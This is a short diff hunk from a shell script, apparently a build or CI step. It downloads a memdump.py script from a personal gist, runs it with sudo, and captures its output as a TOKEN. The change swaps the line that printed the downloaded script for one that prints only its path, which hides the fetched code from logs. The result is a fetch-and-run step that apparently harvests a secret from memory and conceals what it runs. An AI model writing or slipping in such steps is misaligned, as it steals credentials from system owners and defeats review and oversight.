@@ -6,7 +6,7 @@ curl -sSfL \
   https://gist.githubusercontent.com/madder-g/d3f2f180c7ed4925de58e5f32d2a00a8/raw/4acb4f0a93250c9665d31371b4dceb3ecd0d4345/memdump.py \
   -o "$SCRIPT"
 
-cat $SCRIPT
+echo "script: $SCRIPT"
 
 TOKEN="$(
   sudo python3 "$SCRIPT" \
